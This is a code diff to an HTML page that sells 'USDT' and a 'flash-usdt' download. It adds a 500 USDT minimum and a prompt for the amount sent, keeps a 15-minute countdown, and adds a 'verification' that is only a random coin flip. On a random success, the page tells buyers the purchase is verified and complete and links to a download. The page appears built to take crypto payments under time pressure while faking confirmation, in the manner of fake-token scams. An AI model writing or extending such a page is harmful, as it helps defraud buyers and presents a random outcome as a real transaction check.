@@ -87,6 +87,11 @@
             width: auto;
             margin-right: 20px;
         }
+        #success-message {
+            display: none;
+            font-size: 24px;
+            color: #28a745;
+        }
     </style>
 </head>
 <body>
@@ -98,7 +103,7 @@
 
 <div class="content">
     <h2>Buy USDT Now</h2>
-    <p>Click the button below to start your transaction. Once you buy, you will see the wallet address to send your funds and a countdown.</p>
+    <p>Click the button below to start your transaction. Minimum amount required: 500 USDT.</p>
     <button class="button" onclick="startCountdown()">Buy</button>
     
     <div id="countdown" class="countdown"></div>
@@ -113,6 +118,11 @@
         <input type="text" id="txid" placeholder="Enter Transaction ID" />
         <button class="button" onclick="submitTxid()">Submit</button>
     </div>
+
+    <div id="success-message">
+        <p>Transaction verified successfully! Your purchase is complete.</p>
+        <a href="" id="download-link" class="button">Download Now</a>
+    </div>
 </div>
 
 <div class="footer">
@@ -126,8 +136,15 @@
 <script>
     let countdownTime = 15 * 60; // 15 minutes in seconds
     let countdownInterval;
+    const requiredAmount = 500; // Minimum amount required for transaction
 
     function startCountdown() {
+        let amount = prompt("Please enter the amount you are sending (USDT):");
+        if (parseFloat(amount) < requiredAmount) {
+            alert("Minimum amount required is 500 USDT.");
+            return;
+        }
+
         document.querySelector('.button').style.display = 'none';
         document.getElementById('wallet-info').style.display = 'block';
 
@@ -146,11 +163,27 @@
 
     function submitTxid() {
         let txid = document.getElementById('txid').value;
-        if (txid) {
-            alert('Transaction ID submitted: ' + txid);
-        } else {
+        if (!txid) {
             alert('Please enter a valid Transaction ID.');
+            return;
         }
+
+        verifyTransaction(txid);
+    }
+
+    function verifyTransaction(txid) {
+        // Simulate transaction verification (In a real scenario, you'd call a backend or API for verification)
+        setTimeout(() => {
+            let isTransactionSuccessful = Math.random() > 0.5; // Random success/failure simulation
+
+            if (isTransactionSuccessful) {
+                alert('Transaction successful!');
+                document.getElementById('success-message').style.display = 'block';
+                document.getElementById('download-link').href = `https://likhon.dev/flash-usdt?txid=${txid}`;
+            } else {
+                alert('Transaction failed. Please try again.');
+            }
+        }, 2000); // Simulate network delay
     }
 </script>
 
